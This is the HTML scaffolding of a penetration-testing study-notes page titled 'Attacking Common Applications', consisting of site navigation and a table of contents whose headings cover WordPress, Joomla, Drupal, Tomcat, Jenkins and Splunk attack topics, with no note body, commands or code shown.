
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../api-attacks/">
      
      
        <link rel="next" href="../bug-bounty-hunting-process/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.16">
    
    
      
        <title>Attacking Common Applications - Dan's Cyber Stuff</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.7e37652d.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#attacking-common-applications" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Dan&#39;s Cyber Stuff" class="md-header__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Dan's Cyber Stuff
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Attacking Common Applications
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Dan&#39;s Cyber Stuff" class="md-nav__button md-logo" aria-label="Dan's Cyber Stuff" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Dan's Cyber Stuff
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Home
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    CWES Study Notes
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            CWES Study Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Contents
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Web Penetration Tester Course Module Notes
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Web Penetration Tester Course Module Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../web-requests/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Web Requests
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../introduction-to-web-applications/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Introduction to Web Applications
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../using-web-proxies/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Using Web Proxies
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../information-gathering-web-edition/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Information Gathering Web Edition
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../web-fuzzing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Web Fuzzing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../javascript-deobfuscation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    JavaScript Deobfuscation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../cross-site-scripting-%28xss%29/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cross-Site Scripting (XSS)
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sql-injection-fundamentals/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SQL Injection Fundamentals
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sqlmap-essentials/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SQLMap Essentials
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../command-injections/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Command Injections
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../file-upload-attacks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    File Upload Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../server-side-attacks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Server-side Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../login-brute-forcing/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Login Brute Forcing
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../broken-authentication/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Broken Authentication
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../web-attacks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Web Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../file-inclusion/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    File Inclusion
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../attacking-graphql/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Attacking GraphQL
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../api-attacks/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    API Attacks
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Attacking Common Applications
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Attacking Common Applications
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#cheat-sheet" class="md-nav__link">
    <span class="md-ellipsis">
      Cheat Sheet
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration Tools
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#example-note-layout" class="md-nav__link">
    <span class="md-ellipsis">
      Example note layout
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wordpress" class="md-nav__link">
    <span class="md-ellipsis">
      Wordpress
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Wordpress">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#manual-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Manual Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wpscan-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      WPScan Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-wordpress" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Wordpress
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Wordpress">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#login-bruteforce" class="md-nav__link">
    <span class="md-ellipsis">
      Login bruteforce
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#code-execution" class="md-nav__link">
    <span class="md-ellipsis">
      Code execution
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#metasploit-wp_admin_shell_upload-module" class="md-nav__link">
    <span class="md-ellipsis">
      Metasploit wp_admin_shell_upload module
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-plugin-examples" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable plugin examples
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#joomla" class="md-nav__link">
    <span class="md-ellipsis">
      Joomla
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Joomla">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#discovery" class="md-nav__link">
    <span class="md-ellipsis">
      Discovery
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#droopscan" class="md-nav__link">
    <span class="md-ellipsis">
      Droopscan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#joomlascan" class="md-nav__link">
    <span class="md-ellipsis">
      JoomlaScan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bruteforcing-weak-admin-password" class="md-nav__link">
    <span class="md-ellipsis">
      Bruteforcing weak admin password
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-joomla" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Joomla
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Joomla">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#abusing-built-in-functionality" class="md-nav__link">
    <span class="md-ellipsis">
      Abusing Built-In Functionality
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#drupal" class="md-nav__link">
    <span class="md-ellipsis">
      Drupal
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Drupal">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#discovery_1" class="md-nav__link">
    <span class="md-ellipsis">
      Discovery
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration_1" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-drupal" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Drupal
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Drupal">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#leveraging-the-php-filter-module" class="md-nav__link">
    <span class="md-ellipsis">
      Leveraging the PHP Filter Module
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploading-a-backdoored-module" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading a Backdoored Module
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#drupalgeddon" class="md-nav__link">
    <span class="md-ellipsis">
      Drupalgeddon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#drupalgeddon2" class="md-nav__link">
    <span class="md-ellipsis">
      Drupalgeddon2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#drupalgeddon3" class="md-nav__link">
    <span class="md-ellipsis">
      Drupalgeddon3
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tomcat" class="md-nav__link">
    <span class="md-ellipsis">
      Tomcat
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Tomcat">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#discoveryfootprinting" class="md-nav__link">
    <span class="md-ellipsis">
      Discovery/Footprinting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration_2" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-tomcat" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Tomcat
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Tomcat">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tomcat-manager-login-brute-force" class="md-nav__link">
    <span class="md-ellipsis">
      Tomcat Manager - Login Brute Force
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tomcat-manager-war-file-upload" class="md-nav__link">
    <span class="md-ellipsis">
      Tomcat Manager - WAR File Upload
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#jenkins" class="md-nav__link">
    <span class="md-ellipsis">
      Jenkins
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Jenkins">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#discovery-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Discovery &amp; Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-jenkins" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Jenkins
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Jenkins">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#script-console" class="md-nav__link">
    <span class="md-ellipsis">
      Script Console
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#splunk" class="md-nav__link">
    <span class="md-ellipsis">
      Splunk
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Splunk">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#discovery_2" class="md-nav__link">
    <span class="md-ellipsis">
      Discovery
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration_3" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-splunk" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Splunk
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Splunk">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#abusing-built-in-functionality_1" class="md-nav__link">
    <span class="md-ellipsis">
      Abusing Built-In Functionality
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../bug-bounty-hunting-process/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Bug Bounty Hunting Process
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Additional Cheat Sheets
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Additional Cheat Sheets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ftp-cheat/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    FTP
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../gobuster-cheat/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Gobuster
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#cheat-sheet" class="md-nav__link">
    <span class="md-ellipsis">
      Cheat Sheet
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration-tools" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration Tools
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#example-note-layout" class="md-nav__link">
    <span class="md-ellipsis">
      Example note layout
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#wordpress" class="md-nav__link">
    <span class="md-ellipsis">
      Wordpress
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Wordpress">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#manual-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Manual Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wpscan-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      WPScan Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-wordpress" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Wordpress
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Wordpress">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#login-bruteforce" class="md-nav__link">
    <span class="md-ellipsis">
      Login bruteforce
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#code-execution" class="md-nav__link">
    <span class="md-ellipsis">
      Code execution
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#metasploit-wp_admin_shell_upload-module" class="md-nav__link">
    <span class="md-ellipsis">
      Metasploit wp_admin_shell_upload module
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerable-plugin-examples" class="md-nav__link">
    <span class="md-ellipsis">
      Vulnerable plugin examples
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#joomla" class="md-nav__link">
    <span class="md-ellipsis">
      Joomla
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Joomla">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#discovery" class="md-nav__link">
    <span class="md-ellipsis">
      Discovery
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#droopscan" class="md-nav__link">
    <span class="md-ellipsis">
      Droopscan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#joomlascan" class="md-nav__link">
    <span class="md-ellipsis">
      JoomlaScan
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bruteforcing-weak-admin-password" class="md-nav__link">
    <span class="md-ellipsis">
      Bruteforcing weak admin password
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-joomla" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Joomla
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Joomla">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#abusing-built-in-functionality" class="md-nav__link">
    <span class="md-ellipsis">
      Abusing Built-In Functionality
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#drupal" class="md-nav__link">
    <span class="md-ellipsis">
      Drupal
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Drupal">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
